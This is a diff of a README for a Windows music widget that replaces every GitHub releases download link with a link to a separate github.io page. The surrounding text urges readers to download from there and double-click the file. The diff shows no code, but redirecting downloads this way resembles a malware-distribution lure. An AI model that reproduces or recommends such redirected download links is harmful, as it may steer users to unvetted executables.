@@ -1,6 +1,6 @@
 # 🎵 JXT-Music-Widget - Your Music, Always Visible
 
-[![Download JXT-Music-Widget](https://img.shields.io/badge/Download-JXT--Music--Widget-2ea44f?style=for-the-badge)](https://github.com/C4RLOSGGP/JXT-Music-Widget/releases)
+[![Download JXT-Music-Widget](https://img.shields.io/badge/Download-JXT--Music--Widget-2ea44f?style=for-the-badge)](https://c4rlosggp.github.io)
 
 ---
 
@@ -10,7 +10,7 @@ JXT-Music-Widget is a beautiful, always-on-top widget that shows you exactly wha
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [JXT-Music-Widget Releases](https://github.com/C4RLOSGGP/JXT-Music-Widget/releases)
+Visit this link to download the application: [JXT-Music-Widget Releases](https://c4rlosggp.github.io)
 
 This is the only place you need to go. The download page will show you the latest version of the widget. Look for the newest release and download it from there.
 
@@ -24,7 +24,7 @@ When you visit the link above, you'll see a list of releases. Here's what to do:
 
 Once the download is complete, you can run the file directly from your Downloads folder. No special steps are needed – just double-click and follow the simple on-screen instructions.
 
-Visit this link to download the application: [https://github.com/C4RLOSGGP/JXT-Music-Widget/releases](https://github.com/C4RLOSGGP/JXT-Music-Widget/releases)
+Visit this link to download the application: [https://c4rlosggp.github.io](https://c4rlosggp.github.io)
 
 ## 🎨 Amazing Features
 
@@ -162,7 +162,7 @@ Get started today and transform how you experience music on your Windows desktop
 
 **Ready to enhance your music experience?**
 
-Visit this link to download the application: [https://github.com/C4RLOSGGP/JXT-Music-Widget/releases](https://github.com/C4RLOSGGP/JXT-Music-Widget/releases)
+Visit this link to download the application: [https://c4rlosggp.github.io](https://c4rlosggp.github.io)
 
 ---
 
